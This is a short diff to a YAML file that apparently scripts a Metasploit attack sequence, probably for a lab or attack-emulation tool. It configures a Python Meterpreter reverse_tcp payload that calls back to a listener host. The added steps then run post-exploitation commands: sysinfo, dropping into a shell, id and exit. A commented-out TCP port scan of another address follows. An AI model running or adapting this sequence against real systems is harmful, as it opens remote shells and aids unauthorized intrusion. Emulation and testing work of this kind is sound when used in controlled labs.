@@ -26,3 +26,30 @@ commands:
     payload_options:
       LHOST: 192.42.2.253
     payload: cmd/unix/python/meterpreter/reverse_tcp
+
+  - type: sleep
+    seconds: 20
+
+  - type: msf-session
+    stdapi: True
+    cmd: sysinfo
+
+  - type: msf-session
+    cmd: shell
+
+  - type: msf-session
+    shell: True
+    cmd: id
+
+  - type: msf-session
+    shell: True
+    cmd: exit
+
+  - type: msf-session
+    cmd: sysinfo
+
+
+      #  - type: msf-module
+      #    cmd: auxiliary/scanner/portscan/tcp
+      #    options:
+      #      RHOSTS: 192.42.0.254
